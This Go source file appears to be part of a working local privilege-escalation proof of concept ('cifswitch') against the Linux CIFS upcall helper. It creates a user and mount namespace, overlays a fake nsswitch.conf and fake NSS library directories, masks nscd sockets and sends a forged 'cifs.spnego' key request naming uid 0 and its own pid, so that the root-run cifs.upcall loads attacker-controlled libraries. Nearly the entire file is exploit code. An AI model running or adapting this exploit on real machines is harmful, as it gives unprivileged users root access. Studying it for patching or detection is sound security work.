package main

// Namespace setup and forged upcall dispatch.
//
// The Go runtime is multi-threaded: unshare(2) on one thread only affects
// that thread. SysProcAttr.Cloneflags is used instead so that clone(2) is
// called before the child's Go runtime starts, ensuring the entire child
// process lives inside the new user+mount namespace.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	sysRequestKey = 249 // x86_64
	sysKeyctl     = 250 // x86_64

	KEYCTL_JOIN_SESSION_KEYRING = uintptr(1)
	KEY_SPEC_SESSION_KEYRING    = ^uintptr(2) // -3

	MS_PRIVATE = 1 << 18
	MS_REC     = 1 << 14
	MS_BIND    = 1 << 12
)

// spawnTrigger re-executes the current binary inside a new user+mount namespace.
// Parameters are passed via environment variables.
func spawnTrigger(nssLibDirs []string) error {
	exe, err := os.Executable()
	if err != nil {
		exe = "/proc/self/exe"
	}

	cmd := exec.Command(exe)
	cmd.Args = []string{"cifswitch-trigger"}
	cmd.Env = append(os.Environ(),
		triggerEnv+"=trigger",
		"CIFSWITCH_FAKELIBDIR="+fakeLibDir,
		"CIFSWITCH_NSSWITCH="+filepath.Join(workDir, "nsswitch.conf"),
		"CIFSWITCH_NSSDIRS="+strings.Join(nssLibDirs, ":"),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWUSER | syscall.CLONE_NEWNS,
		UidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: uid, Size: 1},
		},
		GidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getgid(), Size: 1},
		},
		GidMappingsEnableSetgroups: false,
	}
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr

	return cmd.Run()
}

// runTrigger runs inside the new user+mount namespace.
// It sets up the fake NSS environment then issues the forged key request.
func runTrigger() {
	fakeLib := os.Getenv("CIFSWITCH_FAKELIBDIR")
	nsswitch := os.Getenv("CIFSWITCH_NSSWITCH")
	nssDirs := strings.Split(os.Getenv("CIFSWITCH_NSSDIRS"), ":")

	if err := keyctlJoinSession("cifswitch-go-poc"); err != nil {
		fmt.Fprintf(os.Stderr, "keyctl join: %v\n", err)
	}

	// Isolate inherited mounts so bind-mounts only affect this namespace
	if err := syscall.Mount("", "/", "", MS_REC|MS_PRIVATE, ""); err != nil {
		fmt.Fprintf(os.Stderr, "make mounts private: %v\n", err)
		os.Exit(1)
	}

	// Trigger kernel module autoload if cifs.ko is not yet loaded
	tryAutoloadCIFS()

	// Hide nscd sockets to force NSS to read our nsswitch.conf
	maskNSSCaches()

	// Overlay our fake nsswitch.conf over /etc/nsswitch.conf
	if err := bindNSSwitch(nsswitch); err != nil {
		fmt.Fprintf(os.Stderr, "bind nsswitch: %v\n", err)
		os.Exit(1)
	}

	// Overlay our fake NSS library directory over each system NSS lib dir
	for _, dir := range nssDirs {
		if dir == "" {
			continue
		}
		if err := syscall.Mount(fakeLib, dir, "", MS_BIND|MS_REC, ""); err != nil {
			fmt.Fprintf(os.Stderr, "bind nss libdir %s: %v\n", dir, err)
			os.Exit(1)
		}
	}

	// Forged description: upcall_target=app + current PID.
	// cifs.upcall reads the pid field and switches into that process's mount namespace.
	desc := fmt.Sprintf(
		"ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"+
			"uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
		os.Getpid())

	ret, errno := requestKey("cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING)
	fmt.Fprintf(os.Stderr, "request_key rc=%d errno=%d\n", int64(ret), errno)

	// Give cifs.upcall time to finish before the namespace is torn down
	time.Sleep(2 * time.Second)
}

// tryAutoloadCIFS triggers a CIFS mount attempt to force cifs.ko to load.
// The mount failure is intentional - only the module load matters.
func tryAutoloadCIFS() {
	dir, err := os.MkdirTemp("", "cifswitch-autoload-*")
	if err != nil {
		return
	}
	defer os.Remove(dir)
	os.Chmod(dir, 0755)
	exec.Command("mount", "-t", "cifs",
		"//127.0.0.1/share", dir,
		"-o", "guest,vers=3.0").Run()
}

// maskNSSCaches hides nscd sockets to prevent cached NSS lookups.
func maskNSSCaches() {
	for _, p := range []string{"/run/nscd", "/var/run/nscd"} {
		fi, err := os.Stat(p)
		if err != nil || !fi.IsDir() {
			continue
		}
		syscall.Mount("tmpfs", p, "tmpfs", 0, "mode=755")
	}
}

// bindNSSwitch overlays source onto /etc/nsswitch.conf (or /usr/etc/).
func bindNSSwitch(source string) error {
	for _, target := range []string{"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf"} {
		if _, err := os.Stat(target); err != nil {
			continue
		}
		if err := syscall.Mount(source, target, "", MS_BIND, ""); err == nil {
			fmt.Fprintf(os.Stderr, "nsswitch -> %s\n", target)
			return nil
		}
	}
	return fmt.Errorf("no valid nsswitch.conf bind target found")
}

// detectNSSLibDirs returns deduplicated directories that contain libnss_files.so.2.
func detectNSSLibDirs() ([]string, error) {
	candidates := []string{
		"/usr/lib64",
		"/lib64",
		"/lib/x86_64-linux-gnu",
		"/usr/lib/x86_64-linux-gnu",
	}
	seen := map[string]bool{}
	var found []string
	for _, c := range candidates {
		if _, err := os.Stat(filepath.Join(c, "libnss_files.so.2")); err != nil {
			continue
		}
		real, err := filepath.EvalSymlinks(c)
		if err != nil {
			real = c
		}
		if !seen[real] {
			seen[real] = true
			found = append(found, real)
		}
	}
	if len(found) == 0 {
		return nil, fmt.Errorf("no NSS lib directory containing libnss_files.so.2 found")
	}
	return found, nil
}

// ── Syscall wrappers ──────────────────────────────────────────────────────────

func requestKey(keyType, description, callout string, destKeyring uintptr) (uintptr, syscall.Errno) {
	t, _ := syscall.BytePtrFromString(keyType)
	d, _ := syscall.BytePtrFromString(description)
	c, _ := syscall.BytePtrFromString(callout)
	r, _, errno := syscall.RawSyscall6(sysRequestKey,
		uintptr(unsafe.Pointer(t)),
		uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(c)),
		destKeyring, 0, 0)
	return r, errno
}

func keyctlJoinSession(name string) error {
	n, _ := syscall.BytePtrFromString(name)
	_, _, errno := syscall.RawSyscall6(sysKeyctl,
		KEYCTL_JOIN_SESSION_KEYRING,
		uintptr(unsafe.Pointer(n)),
		0, 0, 0, 0)
	if errno != 0 {
		return errno
	}
	return nil
}
